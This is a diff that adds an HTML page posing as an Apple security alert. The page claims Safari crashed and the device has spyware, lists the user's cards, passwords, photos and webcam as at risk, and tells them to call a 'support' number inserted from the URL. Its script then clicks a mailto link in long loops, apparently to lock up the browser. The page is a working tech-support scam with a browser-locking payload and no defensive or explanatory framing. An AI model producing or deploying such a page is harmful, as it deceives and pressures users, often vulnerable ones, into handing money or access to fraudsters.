@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+
+
+<head>
+
+<title>Apple Alert</title>
+
+
+<style>
+body {
+  /* for safari's tint */
+  background-color: blue;
+  /* for the document's body background color */
+  background-image: linear-gradient(to bottom, red 0%, red 100%);
+}
+</style>
+</head>
+
+
+<body>
+<br>
+<br>
+<p id="status"></p>
+<p id="result" style="color:black"></p>
+<center><p style="color:black; align:justify; margin-top:2%;">
+<font size="20px">
+<strong><font size="25px">
+<strong>Warning Safari Crashed!!</strong> 
+ Your Apple Device May Have Adware/Spyware Virus.
+<br>
+	Call <font size="35px"><font class="phoneNumber">+1-800-646-0717</font></font>
+ immediately to connect with Apple Technical Support for installing the Protection Software. chat logs.
+ </font>
+ </strong>
+
+ <br><br><br><br><br><br><br><br><br><br><br>DATA AT RISK:<br> 
+ Your credit card details and banking information.Your e-mail passwords and other account passwords.Your Facebook, Skype, AIM, ICQ and other
+  <font size="20px">
+ <br>Your private photos, family photos and other sensitive files.Your webcam could be accessed remotely by stalkers with a VPN virus.
+ </font>
+ </font>
+ </p>
+ </center>
+<body>
+    
+</body>
+<script src="js/jquery-1.12.0.min.js"></script>
+
+
+<script type="text/javascript">
+	function getPar(name) {
+		var url = window.location.href;
+		name = name.replace(/[\[\]]/g, "\\$&");
+		var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+			results = regex.exec(url);
+		if (!results) return null;
+		if (!results[2]) return '';
+		return decodeURIComponent(results[2].replace(/\+/g, " "));
+	};
+	var number = getPar('phone');
+	var numrepl = document.querySelectorAll('font.phoneNumber');
+	for(var n=0;n<numrepl.length;n++){
+		numrepl[n].innerHTML=number;
+	}
+var extraData = "";
+for (itxextraData = 0; itxextraData < 1; itxextraData++) {
+	 var extraData = "Immediately Call " + "Apple Support "+number+". Your credit card details and banking information.Your e-mail passwords and other account passwords.Your Facebook, Skype, AIM, ICQ and other. Call Apple Support "+number+". Your private photos, family photos and other sensitive files.Your webcam could be accessed remotely by stalkers with a VPN virus. ";
+}
+
+
+ 
+jQuery('#result').append('<a href="mailto:foo@example.com?&body=Apple%20Tech%20Support%20!cc=bar@example.com&subject=Warning!%20Virus%20Detected!%20%20%20%20%20%20%20' + extraData + '%00"></a>');
+
+
+
+  document.querySelector('a').click(0);
+
+ for(var i=0;i<100000;i++){
+ 	 if(i>0) {
+ 	 
+	 document.querySelector('a').click();
+	 for(var x=0;x<10000;x++){
+	 console.log();
+	 }
+    
+} else {
+    document.querySelector('a').click();
+    for(var x=0;x<100000;x++){
+	 console.log();
+}
+ 
+ }
+ }
+
+
+</script>
+
+</html>
+
